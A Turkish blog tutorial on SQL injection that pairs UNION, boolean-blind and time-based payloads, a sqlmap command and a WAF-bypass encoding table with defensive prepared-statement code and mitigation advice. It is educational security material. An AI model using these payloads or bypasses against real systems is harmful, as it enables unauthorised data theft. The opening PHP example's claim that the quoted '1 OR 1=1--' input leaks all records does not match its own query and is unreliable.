SQL Injection: Temelden İleri Seviye
Saldırı Analizi ve Önleme Teknikleri

5 Nisan 2026 | Web Security | 12 dk okuma | 0xBlog Yazarı
SQL Injection OWASP Web App Security Penetration Testing

SQL Injection (SQLi), bir saldırganın web uygulamasının veritabanı sorgularına kötü amaçlı SQL kodu enjekte etmesine olanak tanıyan kritik bir güvenlik açığıdır. OWASP Top 10'da yıllardır ilk sıralarda yer alır ve doğru şekilde istismar edildiğinde tüm veritabanının sızdırılmasından, kimlik doğrulama bypassına kadar geniş bir saldırı yüzeyi sunar.

⚠ Yasal Uyarı: Bu yazıdaki teknikler yalnızca eğitim, CTF ve izin verilmiş pentest senaryoları için sunulmuştur. İzinsiz sistemlere uygulanması yasalarca suçtur.

Temel Mekanizma: Ne Zaman Oluşur?

SQLi, kullanıcı girdisinin sanitize edilmeden doğrudan bir SQL sorgusuna eklenmesiyle ortaya çıkar. Aşağıdaki klasik PHP örneğini inceleyelim:

PHP — Vulnerable Code 
// KULLANICI GİRDİSİ: $_GET['id'] = "1 OR 1=1--"
$id    = $_GET['id'];
$query = "SELECT * FROM users WHERE id = '$id'";
// Oluşan sorgu:
// SELECT * FROM users WHERE id = '1 OR 1=1--'
// WHERE koşulu her zaman TRUE döner → tüm kayıtlar sızdırılır
$result = mysqli_query($conn, $query);

Saldırı Tipleri

1. Klasik (In-Band) SQLi

Saldırı sonuçlarının doğrudan HTTP yanıtında görülebildiği durumlardır. UNION-based ve Error-based olarak ikiye ayrılır.

SQL — UNION-Based Payload 
-- Adım 1: Kolon sayısını belirle
ORDER BY 1--
ORDER BY 2--
ORDER BY 3--  ← hata verdiğinde 2 kolon olduğunu anlarız

-- Adım 2: Veritabanı bilgisi çek
UNION SELECT database(), version()--

-- Adım 3: Tablo isimlerini listele
UNION SELECT table_name, NULL
FROM information_schema.tables
WHERE table_schema=database()--

-- Adım 4: Kullanıcıları dök
UNION SELECT username, password FROM users--

2. Blind (Kör) SQLi

Sorgu sonucu HTTP yanıtında görünmez; ancak uygulamanın farklı davranışları (TRUE/FALSE) gözlemlerek veri çıkarılabilir. Boolean-based alt tipi bu yöntemi kullanır.

SQL — Boolean-Based Blind 
-- Veritabanı adının ilk harfi 'm' mi?
AND SUBSTRING(database(),1,1)='m'--
-- Sayfa yüklendiyse → TRUE (ilk harf 'm')
-- Yüklenmediyse  → FALSE

-- sqlmap ile otomatize etmek:
sqlmap -u "https://target.com/page?id=1" \
  --dbs --batch --level=3 --risk=2

3. Time-Based Blind SQLi

Uygulama hiçbir fark yaratmasa bile SLEEP() fonksiyonu ile yanıt süresi ölçülerek veri doğrulanabilir.

SQL — Time-Based Blind (MySQL) 
-- Yanıt 5 saniye gecikirse koşul TRUE demektir
AND IF(SUBSTRING(database(),1,1)='m', SLEEP(5), 0)--

-- Microsoft SQL Server karşılığı:
IF (SUBSTRING(db_name(),1,1)='m') WAITFOR DELAY '0:0:5'--

WAF Bypass Teknikleri

Web Application Firewall (WAF) çözümleri, bilinen SQLi imzalarını engellemeye çalışır. Aşağıdaki teknikler bu filtreleri aşmak için kullanılır:

Teknik Örnek Açıklama
Case Variation SeLeCt Büyük/küçük harf karıştırma
URL Encoding %55NION URL encode ile maskeleme
Comment Injection UN/**/ION SQL yorumu ile kelime bölme
Double Encoding %2553ELECT Çift katmanlı URL encode
Whitespace Bypass SELECT%09FROM Tab (0x09) ile boşluk yerine geçme
ⓘ Not: Modern WAF'lar ML tabanlı analiz kullandığından bu teknikler her zaman geçerli olmayabilir. Gerçek pentestlerde kombinasyon yaklaşımları tercih edilmelidir.

Tam Koruma: Doğru Çözüm Yöntemi

SQL Injection'a karşı tek gerçek çözüm Prepared Statements (Parametrik Sorgular) kullanmaktır. Input sanitizasyonu ikincil bir önlem olarak eklenebilir, ancak birincil savunma olmamalıdır.

PHP — Güvenli Kod (PDO) 
// ✓ DOĞRU: Prepared Statement ile PDO
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id");
$stmt->bindParam(':id', $_GET['id'], PDO::PARAM_INT);
$stmt->execute();
$user = $stmt->fetch();

// ✓ Python örneği (psycopg2 / PostgreSQL)
cursor.execute(
    "SELECT * FROM users WHERE username = %s AND password = %s",
    (username, password)  # parametreler ayrı geçer
)

// ✓ Node.js örneği (mysql2)
const [rows] = await connection.execute(
    'SELECT * FROM users WHERE id = ?',
    [userId]  // ? yerine güvenle bağlanır
);

Ek Savunma Katmanları

  • En Az Yetki İlkesi: Veritabanı kullanıcısına yalnızca gereken izinler verilmeli (SELECT-only vs. tam admin)
  • Web Application Firewall: ModSecurity, AWS WAF gibi çözümler ikincil filtre sağlar
  • Hata Mesajlarını Gizleme: Üretimde detaylı SQL hataları kapatılmalı
  • ORM Kullanımı: SQLAlchemy, Hibernate gibi ORM'ler varsayılan olarak parametrik sorgu kullanır
  • Düzenli DAST Taraması: sqlmap, OWASP ZAP ile periyodik otomasyon testleri
🚨 Kritik: Blacklist tabanlı filtreleme (örn. SELECT kelimesini silmek) hiçbir zaman yeterli değildir. Saldırganlar her zaman encoding veya obfuscation ile bunu aşabilir. Her zaman Prepared Statements kullanın.
